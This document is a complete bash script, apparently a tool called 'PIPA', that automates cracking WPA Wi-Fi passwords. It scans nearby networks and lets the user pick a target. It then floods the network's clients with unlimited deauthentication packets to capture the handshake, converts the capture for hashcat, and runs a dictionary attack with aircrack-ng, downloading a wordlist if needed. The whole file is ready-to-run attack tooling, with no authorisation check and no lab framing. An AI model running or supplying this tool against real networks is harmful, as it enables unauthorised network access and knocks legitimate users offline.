#!/bin/bash

iface="wlan1"
outdir="./dump"
outfile=""
logfile="./log/airodump_attack_log.txt"
essid_list=()
bssid_list=()
chan_list=()
cap_dir="./cap"
hc_dir="./hc"
log_dir="./log"
wordlist="./10_million_password_list_top_10000.txt"

# Colors
RED="\033[31m"
GRN="\033[32m"
YLW="\033[33m"
CYN="\033[36m"
RST="\033[0m"

cl="active"

trap cleanup EXIT

cleanup() {
    if [[ "$cl" == "active" ]]; then
        echo -e "${YLW}[*] Cleaning up temporary files and processes...${RST}"
        [[ -n "$airodump_pid" ]] && kill "$airodump_pid" 2>/dev/null
        [[ -n "$aireplay_pid" ]] && kill "$aireplay_pid" 2>/dev/null
        rm -rf "$outdir"
        rm -f "$logfile"
        rm -f ./*-0*.csv ./*-0*.kismet.csv ./*-0*.kismet.netxml ./*-0*.log.csv
        read -p "[?] Delete handshake capture? (y/n): " cap_choice
        if [[ "$cap_choice" =~ ^[Yy]$ ]]; then
            rm ./*-0*.cap 2>/dev/null
            echo -e "${YLW}[*] Handshake file deleted.${RST}"
        else 
            echo -e "${YLW}[*] Keeping capture file.${RST}"
        fi
        cl="done"
    fi
}

ascii_banner() {
    clear
    echo -e "${RED}
██████╗ ██╗██████╗  █████╗ 
██╔══██╗██║██╔══██╗██╔══██╗
██████╔╝██║██████╔╝███████║
██╔═══╝ ██║██╔═══╝ ██╔══██║
██║     ██║██║     ██║  ██║
╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝${RST}
    "
}

abort_if_q() {
    if [[ "$1" == "q" ]]; then
        echo -e "${YLW}[*] Aborted by user.${RST}"
        cleanup
        exit 0
    fi
}

check_dependencies() {
    echo -e "${CYN}[*] Checking required tools...${RST}"
    for tool in airodump-ng aireplay-ng aircrack-ng hcxpcapngtool; do
        if ! command -v "$tool" &>/dev/null; then
            echo -e "${RED}[!] Tool missing: $tool${RST}"
            echo -e "${CYN}[*] Attempting to install...${RST}"
            sudo apt-get install -y "$tool" || {
                echo -e "${RED}[!] Failed to install $tool. Exiting.${RST}"
                exit 1
            }
        fi
    done
}

prepare_directories() {
    mkdir -p "$cap_dir" "$hc_dir" "$log_dir" "$outdir"
}

start_scan() {
    ascii_banner
    echo -e "${CYN}[*] Scanning for networks on interface $iface (15 seconds)...${RST}"

    rm -f "$outdir"/*

    sudo airodump-ng "$iface" --output-format csv --write "$outdir/dump" > /dev/null 2>&1 &
    scan_pid=$!

    for ((i=15; i>0; i--)); do
        echo -ne "\r${CYN}[*] Time left: $i seconds... ${RST}"
        sleep 1
    done
    echo

    kill $scan_pid 2>/dev/null

    for i in {1..10}; do
        outfile=$(find "$outdir" -name "*-01.csv" | head -n1)
        [[ -f "$outfile" ]] && break
        sleep 0.5
    done

    if [[ ! -f "$outfile" ]]; then
        echo -e "${RED}[!] CSV file not found.${RST}"
        cleanup
        exit 1
    fi
}

parse_networks() {
    ascii_banner
    echo -e "${CYN}[*] Networks found:${RST}\n"

    IFS=$'\n'
    count=0
    parsing=true
    while read -r line; do
        [[ -z "$line" ]] && parsing=false
        $parsing || continue
        [[ "$line" == BSSID* ]] && continue

        bssid=$(echo "$line" | awk -F',' '{gsub(/ /,"",$1); print $1}')
        chan=$(echo "$line" | awk -F',' '{gsub(/ /,"",$4); print $4}')
        pwr=$(echo "$line" | awk -F',' '{gsub(/ /,"",$9); print $9}')
        essid=$(echo "$line" | awk -F',' '{gsub(/^ *| *$/,"",$14); print $14}')

        if [[ -n "$essid" ]]; then
            essid_list+=("$essid")
            bssid_list+=("$bssid")
            chan_list+=("$chan")
            printf "[%d] ESSID: %-25s | PWR: %-3s\n" $((++count)) "$essid" "$pwr"
        fi
    done < "$outfile"

    if (( count == 0 )); then
        echo -e "${RED}[!] No networks found.${RST}"
        cleanup
        exit 1
    fi

    echo
    read -p "[?] Enter network number or 'q' to quit: " choice
    abort_if_q "$choice"

    if [[ "$choice" =~ ^[0-9]+$ ]]; then
        index=$((choice - 1))
    else
        echo -e "${RED}[!] Invalid number.${RST}"
        cleanup
        exit 1
    fi

    selected_essid="${essid_list[$index]}"
    selected_bssid="${bssid_list[$index]}"
    selected_chan="${chan_list[$index]}"

    if [[ -z "$selected_bssid" ]]; then
        echo -e "${RED}[!] Invalid selection.${RST}"
        cleanup
        exit 1
    fi
}

start_attack() {
    ascii_banner
    echo -e "${CYN}[*] Attacking ${GRN}$selected_essid${RST} ($selected_bssid), CH: $selected_chan${RST}"
    sleep 1

    sudo airodump-ng --bssid "$selected_bssid" -c "$selected_chan" -w "$selected_essid" "$iface" > "$logfile" &
    airodump_pid=$!

    sleep 3

    sudo aireplay-ng --deauth 0 -a "$selected_bssid" "$iface" &
    aireplay_pid=$!

    echo
    echo -e "${CYN}[*] Waiting for WPA handshake or press 'q' to quit...${RST}"

    while true; do
        if grep -q "WPA handshake: $selected_bssid" "$logfile"; then
            echo -e "${GRN}[✔] WPA handshake captured!${RST}"
            break
        fi
        read -t 2 -n 1 key
        abort_if_q "$key"
    done

    kill $airodump_pid 2>/dev/null
    kill $aireplay_pid 2>/dev/null

    cap_file="${selected_essid}-01.cap"
    hc22000_file="${selected_essid}.hc22000"

    if [[ -f "$cap_file" ]]; then
        echo -e "${CYN}[*] Converting $cap_file to hc22000 format...${RST}"
        hcxpcapngtool -o "$hc22000_file" "$cap_file" > /dev/null

        if [[ -f "$hc22000_file" ]]; then
            echo -e "${GRN}[✔] Converted: $hc22000_file${RST}"
            mv "$cap_file" "$cap_dir/"
            mv "$hc22000_file" "$hc_dir/"
        else
            echo -e "${RED}[!] Conversion failed.${RST}"
        fi

        echo
        read -p "[?] Start quick dictionary attack? (y/n): " crack_choice
        abort_if_q "$crack_choice"

        if [[ "$crack_choice" =~ ^[Yy]$ ]]; then
            if [[ ! -f "$wordlist" ]]; then
                echo -e "${YLW}[!] Wordlist not found: $wordlist${RST}"
                echo -e "${CYN}[*] Downloading example wordlist...${RST}"
                curl -L -o "$wordlist" https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt || {
                    echo -e "${RED}[!] Failed to download wordlist.${RST}"
                    cleanup
                    exit 1
                }
            fi

            echo -e "${CYN}[*] Launching dictionary attack...${RST}"
            sleep 1
            aircrack-ng -w "$wordlist" -b "$selected_bssid" "$cap_dir/$cap_file"
        else
            echo -e "${YLW}[*] Skipping cracking step.${RST}"
        fi
    else
        echo -e "${RED}[!] Capture file not found: $cap_file${RST}"
    fi

    cleanup
}

# --- Entry point ---
check_dependencies
prepare_directories
start_scan
parse_networks
start_attack
